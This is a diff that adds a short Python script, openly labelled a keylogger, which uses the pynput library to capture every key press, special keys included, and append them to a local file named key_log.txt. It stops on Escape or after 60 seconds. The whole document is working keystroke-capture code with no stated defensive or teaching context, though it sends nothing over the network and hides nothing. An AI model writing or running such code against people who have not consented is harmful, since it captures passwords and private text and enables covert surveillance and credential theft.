@@ -1,0 +1,40 @@
+from pynput import keyboard
+import time
+
+# Define the log file path
+log_file = "key_log.txt"
+
+# This will hold the log of the keystrokes
+log = []
+
+# Start time
+start_time = time.time()
+# Duration for which the keylogger will run (in seconds)
+duration = 60
+
+def on_press(key):
+    try:
+        # Check if the key has an attribute "char" (i.e., a regular key press)
+        log.append(key.char)
+    except AttributeError:
+        # Special keys (e.g., shift, ctrl, arrows) do not have a "char" attribute
+        log.append(f'[{key}]')
+
+    # Periodically write keystrokes to the file to avoid large memory usage
+    if len(log) > 10:
+        with open(log_file, "a") as file:
+            file.write("".join(log))
+            log.clear()  # Clear the log after writing
+
+def on_release(key):
+    # Stop the listener when the escape key is pressed or time is up
+    if key == keyboard.Key.esc or (time.time() - start_time) > duration:
+        return False
+
+# Create and start the listener
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+# Write any remaining keystrokes in the log to the file when the program exits
+with open(log_file, "a") as file:
+    file.write("".join(log))
